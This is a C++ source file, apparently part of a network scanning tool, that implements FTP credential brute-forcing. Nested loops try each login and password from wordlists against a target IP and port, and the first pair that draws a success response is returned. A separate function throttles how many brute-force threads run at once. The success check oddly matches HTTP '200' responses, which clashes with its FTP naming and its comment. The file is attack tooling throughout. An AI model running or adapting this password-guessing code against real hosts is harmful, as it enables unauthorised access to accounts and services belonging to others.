#include "FTPAuth.h"

bool FTPA::checkOutput(const string *buffer) {
    //Login or password incorrect!

    if(Utils::ci_find_substr(*buffer, "200 ok") != -1 ||
            Utils::ci_find_substr(*buffer, "http/1.0 200") != -1 ||
            Utils::ci_find_substr(*buffer, "http/1.1 200") != -1
            ) {

        return true;
    }

    return false;
}

lopaStr FTPA::_FTPBrute(const char *ip, const int port, const PathStr *ps) {
    string buffer;
    string lpString;
    lopaStr lps;
    ZeroMemory(lps.login, sizeof(lps.login));
    ZeroMemory(lps.pass, sizeof(lps.pass));
    ZeroMemory(lps.other, sizeof(lps.other));

    strcpy(lps.login, "UNKNOWN");

    for(int i = 0; i < MaxLogin; ++i)
    {
        if(!globalScanFlag) return lps;
        if(strlen(loginLst[i]) <= 1) continue;

        for(int j = 0; j < MaxPass; ++j)
        {
            if(!globalScanFlag) return lps;
            if(strlen(passLst[j]) <= 1) continue;

            lpString = string(loginLst[i]) + ":" + string(passLst[j]);

            Connector::nConnect(ip, port, &buffer, NULL, NULL, &lpString);

            if(checkOutput(&buffer) != 0) {
                strcpy(lps.login, loginLst[i]);
                strcpy(lps.pass, passLst[j]);
                return lps;
            };

            Sleep(70);
        }
    }

    return lps;
}

lopaStr FTPA::_FTPLobby(const char *ip, const int port, const PathStr *ps){
    while(BrutingThrds >= gMaxBrutingThreads) Sleep(700);

    BruteUtils::BConInc();
    const lopaStr &lps = _FTPBrute(ip, port, ps);
    BruteUtils::BConDec();

    return lps;
}
